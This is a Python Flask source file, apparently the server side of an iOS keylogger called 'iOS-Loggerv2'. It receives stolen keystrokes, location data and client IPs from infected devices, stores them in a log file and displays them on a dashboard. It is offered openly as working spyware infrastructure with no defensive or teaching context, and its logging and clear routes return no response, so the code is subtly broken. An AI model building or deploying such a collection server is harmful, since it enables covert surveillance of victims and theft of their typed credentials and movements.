 #iOS-Loggerv2 Application WebServer DashBoard
 # port 8080
 
 
 #Developed by Abdulrahman AL-Hakkami



from flask import Flask, request, render_template
import json, datetime
import os

app = Flask(__name__)
log_entries = []

@app.route("/dashboard", methods=["GET"])
def dashboard():
    return render_template("dashboard.html", logs=log_entries)

@app.route("/log", methods=["POST"])
def log_data():
    timestamp = datetime.datetime.now().isoformat()
    body = request.form.get('keystroke')
    header = request.headers.get('X-Keystroke')
    location = request.get_json(silent=True)
    client_ip = request.remote_addr

    entry = {
        "timestamp": timestamp,
        "header": header,
        "body": body,
        "location": location,
        "client_ip": client_ip
    }

    log_entries.append(entry)
    with open("log.txt", "a") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


@app.route("/clear", methods=["POST"])
def clear_logs():
    log_entries.clear()
    open("log.txt", "w").close()

if __name__ == "__main__":
    print("🔒 Server on http://0.0.0.0:8080/dashboard")
    app.run(host="0.0.0.0", port=8080)





